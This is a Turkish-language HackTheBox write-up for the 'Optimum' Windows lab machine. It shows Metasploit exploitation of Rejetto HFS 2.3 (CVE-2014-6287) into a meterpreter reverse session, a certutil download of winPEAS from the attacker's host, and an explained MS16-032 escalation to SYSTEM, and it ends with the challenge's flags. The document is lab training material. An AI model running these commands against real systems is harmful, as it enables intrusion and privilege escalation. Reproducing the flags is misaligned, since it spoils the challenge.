# HTB Optimum — Writeup

**Zorluk:** Easy | **OS:** Windows | **Platform:** HackTheBox

---

## About

Optimum is a beginner-level machine which mainly focuses on enumeration of services with known exploits. Both exploits are easy to obtain and have associated Metasploit modules, making this machine fairly simple to complete.

## Nmap Taraması

İlk iş her zaman aynı, klasik bir nmap taraması ile başlıyorum:

```
80/tcp open  http    HttpFileServer httpd 2.3
|_http-title: HFS /
|_http-server-header: HFS 2.3
```

Sadece 80 portu açık, başka hiçbir şey yok. OS tahmini net değil ama Windows Server 2012 R2 / Windows 7 civarına işaret ediyor, en azından makinenin ne kadar eski olduğu konusunda bir fikir veriyor.

## Web Servisine Bakış

Port 80'e gittiğimde beni HttpFileServer'ın kendi arayüzü karşılıyor ve sürüm bilgisi doğrudan sayfada yazıyor:

```
Server information HttpFileServer 2.3 (http://www.rejetto.com/hfs/)
Server time: 9/9/2026 02:57:12
Server uptime: 00:04:17
```

Sürüm numarası bu kadar açık verildiğinde ilk aklıma gelen şey, bilinen bir exploit'i olup olmadığına bakmak oluyor. searchsploit ile hızlıca kontrol ediyorum:

```bash
searchsploit HttpFileServer 2.3
```

```
Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)    | windows/webapps/49125.py
```

HFS 2.3'ün CVE-2014-6287 olarak bilinen, `%00` null byte enjeksiyonu ile dosya uzantısı filtresini bypass edip script çalıştırmaya izin veren bir RCE zafiyeti var. Elle uğraşmak yerine Metasploit'te hazır ve stabil bir modülü olduğu için direkt onu kullanmayı tercih ettim; zaten amacım en hızlı şekilde foothold almak.

## Foothold — Rejetto HFS RCE

```
msf > search HttpFileServer 2.3
```

```
0  exploit/windows/http/rejetto_hfs_exec  2014-09-11  excellent  Yes  Rejetto HttpFileServer Remote Command Execution
```

Rank "excellent" olması iyi bir işaret, exploit'in servisi crash etme riski düşük demek — özellikle HFS gibi eski ve kırılgan bir yazılımda bu önemli.

```
msf exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.129.51.132
msf exploit(windows/http/rejetto_hfs_exec) > set LHOST 10.10.14.187
msf exploit(windows/http/rejetto_hfs_exec) > check
[*] 10.129.51.132:80 - The service is running, but could not be validated. Target detected with version: 2.3
msf exploit(windows/http/rejetto_hfs_exec) > run
```

```
[*] Sending stage (203452 bytes) to 10.129.51.132
[*] Meterpreter session 1 opened (10.10.14.187:4444 -> 10.129.51.132:49162)
```

Shell düştüğü anda user flag zaten masaüstünde duruyordu:

```
meterpreter > cat user.txt
799dbbfbf91d6a1c1d0fed255b7210f3
```

## Privesc Yüzeyini Belirleme

Foothold aldıktan sonra ilk yaptığım şey sistemin genel durumuna bakmak — build numarası, kurulu hotfix'ler, patch seviyesi. Bunun için winPEAS'i hedefe indirip çalıştırdım:

```
certutil -urlcache -split -f http://10.10.14.187:8000/winPEAS.ps1 C:\Users\Public\winPEAS.ps1
powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\winPEAS.ps1
```

Çıktıda dikkatimi çeken satırlar şunlardı:

```
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
Hotfix(s):                 31 Hotfix(s) Installed.
                            ...
                            [31]: KB3014442
```

Build 9600 ve son kurulu hotfix KB3014442 — bu tarih olarak 2015 başına denk geliyor. Yani sistem, Mart 2016'da yayınlanan **MS16-032** bültenini hiç almamış. Hotfix listesinde bu açığı kapatan güncelleme (KB3139914 veya ilgili cumulative update) yok. Tek bu satır bile bana hangi privesc yolunu deneyeceğimi söylüyor.

Burada şunu not etmek isterim: winPEAS gibi araçlar bu tür eksik yamaları otomatik işaretliyor ama aracın ne bulduğunu anlamadan sadece kırmızı satırı kullanmak, aracın yanıldığı ya da yama listesinin eksik göründüğü durumlarda seni kör bırakabiliyor. Build numarasıyla hotfix listesini karşılaştırmak, bu bulguyu elle doğrulamanın basit bir yolu.

## MS16-032 Nedir, Neden Çalışıyor

MS16-032, Windows'un Secondary Logon servisinde, `CreateProcessWithLogonW` API'si etrafında bir handle inheritance / race condition zafiyeti. Kabaca mantığı şöyle:

1. Secondary Logon servisi, düşük yetkili bir kullanıcının farklı bir kullanıcı bağlamında proses başlatmasına izin veriyor (runas mantığı gibi düşünülebilir). Bu işi arka planda ayrıcalıklı bir `svchost.exe` prosesi yönetiyor.
2. Zafiyetli sürümlerde, bu ayrıcalıklı proses, kısa süreliğine oluşturduğu bir impersonation token'ı yeterince sıkı kısıtlamadan yeni thread'e miras bırakıyor.
3. Saldırgan `CreateProcessWithLogonW` çağrısını bilinçli olarak geçersiz kimlik bilgileriyle tetikleyip, bu başarısız çağrı sırasında kısa ömürlü ama SYSTEM yetkisindeki bir thread handle'ını yakalıyor.
4. Bu handle üzerinden `NtImpersonateThread` ve `DuplicateToken` çağrılarıyla SYSTEM token'ı kendi prosesine taşınıyor ve yeni bir SYSTEM prosesi (cmd.exe / powershell) başlatılıyor.

Yani özetle: kimlik doğrulama başarısız olsa bile, ayrıcalıklı servisin bıraktığı geçici bir handle düşük yetkili tarafa sızıyor. Metasploit'teki `ms16_032_secondary_logon_handle_privesc` modülü, FuzzySec'in `Invoke-MS16032` PoC'sinin uyarlanmış hali ve tüm bu adımları otomatik yürütüyor.

## Privesc — Uygulama

Mevcut oturumu arka plana alıp local exploit modülüne geçiyorum:

```
meterpreter > background
msf exploit(windows/http/rejetto_hfs_exec) > search ms16_032
```

```
0  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  2016-03-21  normal  Yes  MS16-032 Secondary Logon Handle Privilege Escalation
```

```
msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > sessions
```

```
Id  Name  Type                     Information               Connection
--  ----  ----                     -----------               ----------
2         meterpreter x86/windows  OPTIMUM\kostas @ OPTIMUM  10.10.14.187:4444 -> 10.129.51.132:49172
```

Session'ı ve LHOST'u ayarlayıp modülü çalıştırıyorum:

```
msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set SESSION 2
msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set LHOST 10.10.14.187
msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > run
```

Script hedefte çalışırken çıktı, yukarıda anlattığım mekanizmayı adım adım gösteriyor:

```
[?] Operating system core count: 2
[>] Duplicating CreateProcessWithLogonW handle
[?] Done, using thread handle: 1912
[*] Sniffing out privileged impersonation token..
[?] Thread belongs to: svchost
[+] Thread suspended
[>] Wiping current impersonation token
[>] Building SYSTEM impersonation token
```

Bu noktada bir `NtImpersonateThread failed` hatası aldım. Bu, 32-bit payload'ın 64-bit mimaride SYSWOW64 altında çalıştırılmasından kaynaklanan, bu exploit'te sık görülen ve genelde zararsız bir ara adım hatası — script fallback mantığıyla devam ediyor:

```
[*] Sniffing out SYSTEM shell..
[>] Duplicating SYSTEM token
[>] Starting token race
[>] Starting process race
[!] Holy handle leak Batman, we have a SYSTEM shell!!
```

```
[*] Meterpreter session 4 opened (10.10.14.187:4444 -> 10.129.51.132:49173)
```

Yeni session'da shell alıp yetkiyi kontrol ediyorum:

```
meterpreter > shell
C:\Users\kostas\Desktop>whoami
nt authority\system
```

SYSTEM yetkisi elimde.

## Root Flag

```
C:\Users\Administrator\Desktop>dir
09/09/2026  02:53                34 root.txt

C:\Users\Administrator\Desktop>type root.txt
b4a3294e59e62c5015391024c1e75006
```

---

**Flag'ler:**

- User: `799dbbfbf91d6a1c1d0fed255b7210f3`
- Root: `b4a3294e59e62c5015391024c1e75006`
